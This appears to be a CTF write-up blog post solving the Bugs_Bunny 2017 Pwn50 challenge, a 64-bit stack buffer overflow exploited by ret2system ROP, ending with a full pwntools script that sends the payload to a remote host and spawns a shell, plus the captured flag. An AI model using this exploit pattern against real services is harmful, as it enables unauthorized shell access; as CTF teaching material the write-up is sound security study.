---
title: Bugs_Bunny CTF 2017 -Pwn50
subtitle: Walkthrough the Solution of Pwn50 challenge
date: 2017-03-20
tags: ["Posts",Bugs_bunny CTF", "Pwn"]
---



Hello guys, Welcome to my first writeup.


challenge: **pwn50**


we are given a binary and asked to pwn. 


My general procedure is to examine for `BOF, FSB`.   
First i run the binary  
Then use `objdump` to see the functions and the calls  
Then use `gdb-peda` to analyse the flow and registers and stacks.


Now, lets examine it.  

* file pwn50 :

![image](/img/pwn50/1.png)

* strings pwn50 :

![image](/img/pwn50/2.png)

* checksec pwn50 :

![image](/img/pwn50/3.png)


Information gathered:  
&nbsp;&nbsp;Its a 64-bit binary with NX enabled and the elf contains `"/bin/bash"`

why it matters:

* 64-bit		:	Parameters have to be passed in registers. Register's size is 64-bit (obvious :P)  

* NX-enabled 	:   Typical shellcode on stack wont work as the Stack is no longer 

* Executable. Hence indicates the need for ROPping
`"/bin/bash"` : 	Cool, simplifies the challenge as the motive of the challenge is to shell.


Now run the binary.


![image](/img/pwn50/4.png)


On running the binary, it gets the input and runs fine but if its long gives segfault.
Ok, its just a 50 point, So typical Buffer Overflow.
So, i proceed to find the offset to RIP with gdb.

![image](/img/pwn50/5.png)
---
![image](/img/pwn50/6.png)
---
![image](/img/pwn50/7.png)


Cool, The RBP is at `offset 48`, Hence RIP at 56(48+8).


Now, lets start planning the exploit:
1. fill with "A"s upto RIP.
2. get a pointer to `"/bin/bash"` 
3. pop it into rdi
4. call system
5. send the payload ofcourse


Now, what informations we need to do it:  
1. Offset to `RIP`  #have it
2. Rop gadget: `pop rdi;` ret #have to get it
3. Pointer to `"/bin/bash"`	#have to get it
4. Call to `System()`			#have to get it

In 32-bit architecture, the parameter can be passed by placing in stack. 
But in 64-bit, it has to be popped into registers, the first parameter into rdi.

Now, to gather the information we need:

1).Rop gadget:  
`ROPgadget --binary pwn50 | grep pop| grep rdi`

![image](/img/pwn50/8.png)

2).Pointer to `"/bin/bash"` :  
pwntools come to the rescue. 
![image](/img/pwn50/9.png)

		I showed another way to find the address of the gadgets with pwntools

3). `objdump -d pwn50 | grep call | grep system`

![image](/img/pwn50/10.png)

Final exploit:  



```python

from pwn import *

elf=ELF('pwn50')
pop_ret=0x400743
bin_bash=0x400773
call_system=0x4006c9

payload="A"*48+"B"*8
payload+=p64(pop_ret)
payload+=p64(bin_bash)
payload+=p64(call_system)

r=remote('54.67.102.66','5251')
r.send(payload)
r.interactive()

#cat /home/pwn50/flag
#Bugs_Bunny{lool_cool_stuf_even_its_old!!!!!}

```

